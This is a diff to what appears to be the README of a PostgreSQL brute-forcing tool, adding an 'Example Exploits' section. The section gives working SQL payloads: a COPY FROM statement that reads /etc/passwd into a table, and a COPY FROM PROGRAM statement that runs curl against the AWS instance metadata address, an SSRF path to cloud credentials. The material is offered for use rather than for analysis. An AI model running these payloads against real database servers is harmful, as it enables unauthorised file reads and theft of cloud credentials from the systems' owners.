@@ -26,3 +26,25 @@ go run postgres-brute.go 1.1.1.1
 postgres
 
 ```
+
+
+Example Exploits
+----
+
+Grab `/etc/passwd/
+
+```
+CREATE TABLE myfile (input TEXT);
+COPY myfile FROM '/etc/passwd';
+SELECT input FROM myfile;
+```
+
+SSRF - Grab AWS Metadata
+
+```
+CREATE TABLE weather_json (cities TEXT);
+COPY weather_json FROM PROGRAM 'curl -L http://169.254.169.254/latest/meta-data/';
+SELECT weather_json FROM weather_json;
+```
+
+
